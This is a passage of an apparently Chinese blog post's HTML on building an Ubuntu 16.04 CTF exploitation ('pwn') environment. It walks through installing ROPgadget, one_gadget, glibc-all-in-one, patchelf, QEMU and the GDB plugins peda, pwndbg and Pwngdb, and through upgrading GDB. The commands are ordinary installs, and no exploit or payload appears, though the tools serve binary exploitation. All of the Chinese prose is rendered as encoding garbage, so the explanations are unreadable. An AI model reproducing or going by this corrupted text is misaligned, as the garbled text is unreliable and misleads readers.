ROPgadgetpip <span class="token function">install</span> <span class="token assign-left variable">ROPgadget</span><span class="token operator">==</span>ç‰ˆæœ¬å·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é‡è£… ROPgadget åè‹¥å› ä¸ºæ—§ç‰ˆæœ¬è€Œå¯¼è‡´ pip äº§ç”Ÿè­¦å‘Šï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Skipping /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info due to invalid metadata entry <span class="token string">'name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ é™¤è¯¥æ–‡ä»¶å³å¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="å®‰è£…-one-gadget"><a href="#å®‰è£…-one-gadget" class="headerlink" title="å®‰è£… one_gadget"></a>å®‰è£… one_gadget</h2><blockquote><p>one_gadget å¯ä»¥ç”¨æ¥åŠ¨æ€æŸ¥æ‰¾æ‰§è¡Œ libc åŠ¨æ€åº“ä¸­çš„ system æ‰§è¡Œå‡½æ•°ï¼Œå¯ä»¥ä¸€æ­¥åˆ°ä½<br>åœ¨åšç›¸å…³å †é¢˜æ—¶å°¤ä¸ºæœ‰æ•ˆï¼Œç”¨æ¥å¯»æ‰¾ libc åº“ä¸­çš„ <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> ï¼Œä¸€ä¸ª gadget å°±å¯ä»¥ getshellï¼Œä½†éœ€è¦æ³¨æ„ one_gadget ç›¸å…³é™åˆ¶æ¡ä»¶</p></blockquote><p>æ³¨æ„ï¼šone_gadget éœ€è¦å®‰è£… ruby <strong>ï¼ˆruby &lt; 2.4 ä¼šå¯¼è‡´ one_gadget æ— æ³•å®‰è£…ï¼‰</strong></p><p>æœ€å¥½æ˜¯é€šè¿‡æ·»åŠ ä»“åº“çš„æ–¹å¼å®‰è£… rubyï¼ŒUbuntu 16.04 ä½¿ç”¨ <code>sudo apt install ruby</code> å®‰è£…çš„ ruby &lt; 2.4</p><p>é€šè¿‡æ·»åŠ ä»“åº“å®‰è£… rubyï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># åˆ é™¤æ—§ç‰ˆæœ¬ ruby</span><span class="token function">sudo</span> <span class="token function">apt</span> purge --auto-remove ruby<span class="token comment"># æ·»åŠ ä»“åº“</span><span class="token function">sudo</span> add-apt-repository ppa:brightbox/ruby-ng<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token comment"># æŒ‡å®š ruby 2.6 ç‰ˆæœ¬</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby2.6 ruby2.6-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®‰è£… one_gadgetï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="å®‰è£…-glibc-all-in-one"><a href="#å®‰è£…-glibc-all-in-one" class="headerlink" title="å®‰è£… glibc-all-in-one"></a>å®‰è£… glibc-all-in-one</h2><blockquote><p>åœ¨åšå †é¢˜æ—¶ï¼Œç»å¸¸é‡åˆ°ä¸åŒç‰ˆæœ¬çš„ libcï¼Œè¿™æ—¶ glibc-all-in-one å¯ä»¥å¾ˆå¥½çš„æ´¾ä¸Šç”¨åœºï¼ŒåŠ¨æ€æ›´æ”¹ elf æ–‡ä»¶ libc ç‰ˆæœ¬</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git /opt/glibc-all-in-one<span class="token builtin class-name">cd</span> /opt/glibc-all-in-one./update_list   <span class="token comment"># è·å–å¯ä»¥æ›´æ–°çš„ glibc çš„ç‰ˆæœ¬</span><span class="token function">cat</span> list   <span class="token comment"># æŸ¥çœ‹å¯ä¸‹è½½çš„ glibc</span>./download éœ€è¦çš„libcç‰ˆæœ¬   <span class="token comment"># ä¾‹å¦‚ï¼š2.31-0ubuntu9_amd64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é»˜è®¤ä¸‹è½½åˆ° glibc-all-in-one çš„ <code>/libs</code> ç›®å½•ä¸‹</p><p>å¦‚æœè¿è¡Œ <code>./update_list</code> æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">requests.exceptions.ProxyError: HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'mirror.tuna.tsinghua.edu.cn'</span>, <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span>: Max retries exceeded with url: /ubuntu/pool/main/g/glibc/ <span class="token punctuation">(</span>Caused by ProxyError<span class="token punctuation">(</span><span class="token string">'Unable to connect to proxy'</span>, SSLError<span class="token punctuation">(</span>SSLEOFError<span class="token punctuation">(</span><span class="token number">8</span>, <span class="token string">'EOF occurred in violation of protocol (_ssl.c:997)'</span><span class="token punctuation">))</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ£€æŸ¥ <code>urllib3</code> åº“çš„ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> urllib3<span class="token comment"># urllib3            2.0.7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å°† <code>urllib3</code> åº“é™çº§ï¼Œå³å¯è§£å†³ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall urllib3pip <span class="token function">install</span> <span class="token assign-left variable">urllib3</span><span class="token operator">==</span><span class="token number">1.25</span>.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-patchelf"><a href="#å®‰è£…-patchelf" class="headerlink" title="å®‰è£… patchelf"></a>å®‰è£… patchelf</h2><blockquote><p>ä¸ glibc-all-in-one é…åˆä½¿ç”¨ï¼Œå¯ä»¥ç”¨äºæ›´æ”¹ elf æ–‡ä»¶ libc ç‰ˆæœ¬</p></blockquote><ul><li>é€šè¿‡ apt å®‰è£…</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æºç ç¼–è¯‘å®‰è£…</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/NixOS/patchelf.git /opt/patchelf<span class="token builtin class-name">cd</span> /opt/patchelf<span class="token function">sudo</span> ./bootstrap.sh<span class="token function">sudo</span> ./configure<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> check<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># éªŒè¯å®‰è£…ï¼š</span>patchelf <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œ <code>sudo ./bootstrap.sh</code> å¯èƒ½ä¼šæŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./bootstrap.sh: <span class="token number">2</span>: ./bootstrap.sh: autoreconf: not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…æ‰€éœ€çš„åŒ…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="å®‰è£…-main-arena-offset"><a href="#å®‰è£…-main-arena-offset" class="headerlink" title="å®‰è£… main_arena_offset"></a>å®‰è£… main_arena_offset</h2><blockquote><p>è·å–ç»™å®š libc çš„ main_arena åç§»é‡</p><p>ä½œè€… <a href="https://github.com/zarkivy">zarkivy</a> å°†å…¶é›†æˆåˆ°äº† pymao åº“ä¸­ï¼š<a href="https://github.com/zarkivy/py_main_arena_offset">GitHub - zarkivy&#x2F;py_main_arena_offset: Get main_arena offset of a given libc with python</a> ï¼ˆä¾èµ–äº objdumpï¼Œè¯·ç¡®ä¿ä½ çš„ Linux ä¸­å·²å®‰è£… binutils åŒ…ï¼‰</p></blockquote><ul><li>åŸç‰ˆ</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/bash-c/main_arena_offset /opt/main_arena_offset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/main_arena_offset./main_arena libcæ–‡ä»¶å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>pymao é›†æˆç‰ˆ</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/IZAY01/py_main_arena_offset /opt/py_main_arena_offset<span class="token builtin class-name">cd</span> /opt/py_main_arena_offset<span class="token function">sudo</span> python3 setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pymao <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> <span class="token string">"./libc-2.27.so"</span>main_arena_offset <span class="token operator">=</span> gmao<span class="token punctuation">(</span>libc<span class="token punctuation">)</span><span class="token comment"># or main_arena_offset = get_main_arena_offset(libc)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-QEMU"><a href="#å®‰è£…-QEMU" class="headerlink" title="å®‰è£… QEMU"></a>å®‰è£… QEMU</h2><blockquote><p>è¿™æ˜¯ arm çš„ pwn ç¯å¢ƒï¼ŒQEMU å¯ä»¥ç”¨æ¥æ¨¡æ‹Ÿå„ç§æ¶æ„çš„å›ºä»¶çš„è¿è¡Œï¼Œå‰æœŸå¯ä»¥ä¸å®‰è£…ï¼Œä½†æ˜¯ç»ˆç©¶æ˜¯é€ƒä¸è¿‡çš„ï¼Œå»ºè®®ä¸€æ­¥åˆ°ä½</p><p>VMware å’Œ Virtualbox ä¹‹ç±»é€šå¸¸åªèƒ½åœ¨ x86 è®¡ç®—æœºä¸Šè™šæ‹Ÿå‡ºä¸€ä¸ª x86 è™šæ‹Ÿæœºï¼Œè€Œ QEMU æ”¯æŒåœ¨ x86 ä¸Šè™šæ‹Ÿå‡ºä¸€ä¸ª ARM è™šæ‹Ÿæœº</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu qemu-kvm virt-manager bridge-utils binfmt-support<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span>  qemu-system qemu-user-static   <span class="token comment"># å®‰è£…ç³»ç»Ÿæ€ã€ç”¨æˆ·æ€</span><span class="token comment"># å®‰è£…ä¾èµ–åº“</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡ apt æ–¹å¼å®‰è£…çš„ QEMU å¸è½½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># åˆ é™¤åŒ…å’Œç›¸å…³ä¾èµ–</span><span class="token function">sudo</span> <span class="token function">apt-get</span> remove --auto-remove qemu*<span class="token comment"># åˆ é™¤é…ç½®æ–‡ä»¶å’Œç›¸å…³çš„æ•°æ®æ–‡ä»¶</span><span class="token function">sudo</span> <span class="token function">apt-get</span> purge --auto-remove qemu*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-Zsteg"><a href="#å®‰è£…-Zsteg" class="headerlink" title="å®‰è£… Zsteg"></a>å®‰è£… Zsteg</h2><blockquote><p>åš MISC éœ€è¦ï¼Œå›¾åƒéšå†™ç¥å™¨</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="å®‰è£…-Basecrack"><a href="#å®‰è£…-Basecrack" class="headerlink" title="å®‰è£… Basecrack"></a>å®‰è£… Basecrack</h2><blockquote><p>åš REVERSEã€MISC éœ€è¦ï¼ŒBase ç³»åˆ—ç¼–ç åˆ†æå·¥å…·</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git /opt/basecrack<span class="token builtin class-name">cd</span> /opt/basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="å‡çº§-GDB-åˆ°-gdb-10-2"><a href="#å‡çº§-GDB-åˆ°-gdb-10-2" class="headerlink" title="å‡çº§ GDB åˆ° gdb-10.2"></a>å‡çº§ GDB åˆ° gdb-10.2</h1><blockquote><p>Ubuntu 16.4 è‡ªå¸¦çš„ GDB ç‰ˆæœ¬å¤ªè€ï¼ˆgdb-7.11.1ï¼‰ï¼Œå¯ä»¥æ›´æ–°åˆ° gdb-10.2</p><p>æˆ‘å°è¯•è¿‡å®‰è£… gdb-12.1 å’Œ gdb-11.2ï¼Œä½†æ˜¯éƒ½ä¼šæŠ¥é”™ï¼Œä¼°è®¡ä¸ python 3.5 æœ‰å…³ ï¼ˆä½¿ç”¨ python 3.10.6 ç¼–è¯‘ GDB ä¾ç„¶æŠ¥é”™ï¼‰ï¼Œæš‚æœªè§£å†³ï¼Œå¦‚æœä½ å–œæ¬¢æŠ˜è…¾å¯ä»¥è‡ªå·±å°è¯•ä¸€ä¸‹ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º1.png"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a href="https://blog.csdn.net/qq_39153421/article/details/116753735">Ubuntu16.04å‡çº§gdb7.11å‡çº§åˆ°10.2ç‰ˆæœ¬_ubuntu gdbå‡çº§å‘½ä»¤-CSDNåšå®¢</a></li><li><a href="https://blog.csdn.net/EJoft/article/details/123036910">Ubuntu18.04å‡çº§gdb10.2_gdb10.2.tar.gz_EJoftçš„åšå®¢-CSDNåšå®¢</a></li></ol></blockquote><p>ä¸‹è½½ GDB æºç ï¼š<a href="https://ftp.gnu.org/gnu/gdb/">Index of &#x2F;gnu&#x2F;gdb</a></p><p>è¿™é‡Œä»¥ gdb-10.2.tar.gz ä¸ºä¾‹</p><p>ç¼–è¯‘å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> gdb-10.2.tar.gz<span class="token builtin class-name">cd</span> ./gdb-10.2<span class="token function">mkdir</span> build <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> build<span class="token function">sudo</span> <span class="token punctuation">..</span>/configure --with-python<span class="token operator">=</span>/usr/bin/python3.5 --enable-targets<span class="token operator">=</span>all<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ <code>--with-python=/usr/bin/python3.5</code> æŒ‡å®šä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ python 3.5 æ¥ç¼–è¯‘ GDB</p><p>å¦‚æœè‡ªå·±æºç ç¼–è¯‘å®‰è£…äº†æ–°ç‰ˆçš„ Pythonï¼Œè¿™é‡ŒæŒ‡å®šç”¨æ–°ç‰ˆçš„ Python è¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘æ—¶å¯èƒ½ä¼šæŠ¥ä¸‹åˆ—é”™è¯¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">configure: WARNING: MPFR is missing or unusable<span class="token punctuation">;</span> some features may be unavailable.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç½‘ä¸Šè¯´æ˜¯ä¸ Python çš„ <code>distutils</code> å’Œ <code>dev</code> æœ‰å…³ï¼Œæºç ç¼–è¯‘çš„ Python ç¼ºå°‘ç›¸åº”çš„ <code>python-distutils</code> å’Œ <code>python-dev</code></p><p>ä½†æ˜¯æš‚æ—¶è¿˜æœªè§£å†³è¯¥é—®é¢˜ï¼Œæ‰€ä»¥å»ºè®®ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ python 3.5 æ¥ç¼–è¯‘ GDBï¼Œè¾ƒä¸ºç¨³å®š</p><p>ç¼–è¯‘è¿‡ç¨‹å¾ˆæ¼«é•¿ï¼Œç¼–è¯‘å¯èƒ½ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: <span class="token string">'makeinfo'</span> is missing on your system.         You should only need it <span class="token keyword">if</span> you modified a <span class="token string">'.texi'</span> file, or         any other <span class="token function">file</span> indirectly affecting the aspect of the manual.         You might want to <span class="token function">install</span> the Texinfo package:         <span class="token operator">&lt;</span>http://www.gnu.org/software/texinfo/<span class="token operator">></span>         The spurious makeinfo call might also be the consequence of         using a buggy <span class="token string">'make'</span> <span class="token punctuation">(</span>AIX, DU, IRIX<span class="token punctuation">)</span>, <span class="token keyword">in</span> <span class="token function">which</span> <span class="token keyword">case</span> you might         want to <span class="token function">install</span> GNU make:         <span class="token operator">&lt;</span>http://www.gnu.org/software/make/<span class="token operator">></span>make<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>: *** <span class="token punctuation">[</span>gdb.info<span class="token punctuation">]</span> Error <span class="token number">127</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®‰è£… <code>texinfo</code> å³å¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> texinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥ï¼Œæ›¿æ¢è€ç‰ˆæœ¬ GDB</p><p>ç¼–è¯‘ç”Ÿæˆçš„æ–°ç‰ˆ gdb äºŒè¿›åˆ¶æ–‡ä»¶ä¸€èˆ¬ä½äºç¼–è¯‘ç›®å½• <code>gdb-10.2/build/gdb/gdb</code>ï¼Œå¦‚æœä¸åœ¨è¯¥ç›®å½•ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨æŒ‡ä»¤æŸ¥æ‰¾ï¼š<code>sudo find / -name gdb</code></p><p>å°† gdb äºŒè¿›åˆ¶æ–‡ä»¶æ‹·è´åˆ° <code>/usr/bin/</code> ä¸‹ï¼Œæ›¿æ¢åŸæ¥çš„æ—§ç‰ˆ gdbï¼Œä¹Ÿå¯ä»¥å…ˆå°†åŸæ¥çš„æ—§ç‰ˆ gdb åšä¸ªå¤‡ä»½ï¼Œä»¥é˜²å‡ºé—®é¢˜ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> /usr/local/bin/gdb /usr/local/bin/gdb-7.11.1.backup<span class="token comment"># ä»¥è‡ªå·±ç¼–è¯‘çš„æ–°ç‰ˆ gdb å®é™…è·¯å¾„ä¸ºä¸»</span><span class="token function">sudo</span> <span class="token function">cp</span> ~/ä¸‹è½½/gdb-10.2/build/gdb/gdb /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œ GDBï¼Œå‡çº§å®Œæˆï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º6.png"></p><hr><h1 id="GDB-é…ç½®"><a href="#GDB-é…ç½®" class="headerlink" title="GDB é…ç½®"></a>GDB é…ç½®</h1><blockquote><p><em>è§ ã€ŠGDBçš„åŸºç¡€å’Œä½¿ç”¨ã€‹ä¸€æ–‡ï¼Œæœ‰éå¸¸è¯¦ç»†çš„ä»‹ç»</em></p><p><mark>ä½†æ˜¯éœ€è¦æ³¨æ„ï¼ŒUbuntu 16.04 ç”±äºç‰ˆæœ¬å¤ªè€ï¼Œæ— æ³•ç›´æ¥å®‰è£…æœ€æ–°ç‰ˆ <code>pwndbg</code> å’Œ <code>gef</code>ï¼Œè¦è‡ªå·±é€šè¿‡æ—§ç‰ˆæœ¬å®‰è£…</mark></p><p><strong>Ubuntu 16.04 å®‰è£… GDB æ’ä»¶è¯·ä»¥æœ¬æ–‡ä¸ºä¸»</strong>ï¼Œ<strong>è®¾ç½®è„šæœ¬è‡ªåŠ¨åˆ‡æ¢ GDB æ’ä»¶å¯ä»¥å‚ç…§ã€ŠGDBçš„åŸºç¡€å’Œä½¿ç”¨ã€‹ä¸€æ–‡</strong></p></blockquote><h2 id="å®‰è£…-peda"><a href="#å®‰è£…-peda" class="headerlink" title="å®‰è£… peda"></a>å®‰è£… peda</h2><p>æœ€æ–°ç‰ˆå®‰è£…æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/longld/peda.git /opt/gdb_plugins/peda<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/peda/peda.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>åœ¨ Ubuntu 16.04 ä¸­ä½¿ç”¨ä¸Šè¿°æ–¹æ³•å®‰è£…ï¼Œæš‚æ—¶æ²¡æœ‰å‡ºç°é—®é¢˜</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA9.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º9.png"></p><hr><h2 id="å®‰è£…-pwndbg"><a href="#å®‰è£…-pwndbg" class="headerlink" title="å®‰è£… pwndbg"></a>å®‰è£… pwndbg</h2><blockquote><p><code>pwndbg</code> ä¸ <code>Pwngdb</code> éœ€è¦ä¸€èµ·æ­é…ä½¿ç”¨</p></blockquote><p>æœ€æ–°ç‰ˆå®‰è£…æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/pwndbg/pwndbg /opt/gdb_plugins/pwndbg<span class="token builtin class-name">cd</span> /opt/gdb_plugins/pwndbg<span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>å¦‚æœåœ¨ Ubuntu 16.04 è¿™æ ·çš„è€ç‰ˆæœ¬ä¸­ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œå®‰è£…è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™<br>å› ä¸º python ç‰ˆæœ¬å¤ªä½ä¸æ”¯æŒæ–°çš„è¯­æ³•ï¼Œæ— æ³•å®‰è£…æœ€æ–°çš„ pwndbg <em>ï¼ˆpwndbg ä¼šæ£€æµ‹ GDB æ‰€ä½¿ç”¨çš„ python ç‰ˆæœ¬ï¼Œä¸ GDB çš„ python ä¿æŒä¸€è‡´ï¼Œé»˜è®¤æ˜¯ python 3.5ï¼‰</em></p><p>æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">File <span class="token string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/cli/main.py"</span>, line <span class="token number">57</span>  sys.stderr.write<span class="token punctuation">(</span>f<span class="token string">"ERROR: &#123;exc&#125;"</span><span class="token punctuation">)</span>  ^  SyntaxError: invalid syntax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º2.png"></p></blockquote><p>Ubuntu 16.04 éœ€è¦åœ¨ <a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a> ä¸­ä¸‹è½½æ—§ç‰ˆæœ¬çš„æºç </p><p>æ¯”å¦‚ 2021 ç‰ˆçš„ pwndbg å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼š<a href="https://github.com/pwndbg/pwndbg/tree/2021.06.22">pwndbg&#x2F;pwndbg at 2021.06.22 (github.com)</a> ï¼ˆå®æµ‹ <code>pwndbg-2022.01.05</code> ç‰ˆä¹Ÿå¯ä»¥ï¼‰</p><p>ç„¶åè§£å‹ç§»åŠ¨åˆ° <code>/opt/gdb_plugins/</code> ç›®å½•ä¸‹ï¼Œåœ¨ <code>/opt/gdb_plugins/pwndbg-2021.06.22</code> ç›®å½•ä¸‹ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+ <span class="token function">git</span> submodule update <span class="token parameter variable">--init</span> <span class="token parameter variable">--recursive</span>fatal: Not a <span class="token function">git</span> repository <span class="token punctuation">(</span>or any of the parent directories<span class="token punctuation">)</span>: .git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨å½“å‰ç›®å½•ä¸‹åˆå§‹åŒ– git å†é‡æ–°å®‰è£…å³å¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å®‰è£…-Pwngdb"><a href="#å®‰è£…-Pwngdb" class="headerlink" title="å®‰è£… Pwngdb"></a>å®‰è£… Pwngdb</h3><p>å®‰è£…æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git /opt/gdb_plugins/Pwngdb<span class="token builtin class-name">cd</span> /opt/gdb_plugins/Pwngdb<span class="token function">sudo</span> <span class="token function">cp</span> .gdbinit ~/<span class="token function">sudo</span> <span class="token function">vim</span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ <code>~/.gdbinit</code> çš„ç¬¬äºŒè¡Œæ’å…¥ï¼šï¼ˆè®°å¾—æ’å…¥åœ¨ <code>source /opt/gdb_plugins/Pwngdb/pwngdb.py</code> è¿™ä¸€å¥çš„å‰é¢ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg-2021.06.22/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœ pwndbg çš„è·¯å¾„ä¸æ˜¯ <code>/opt/gdb_plugins/pwndbg-2021.06.22</code>ï¼Œè¯·æŒ‰ç…§è‡ªå·±çš„å®é™…è·¯å¾„ä¿®æ”¹</p><p><img 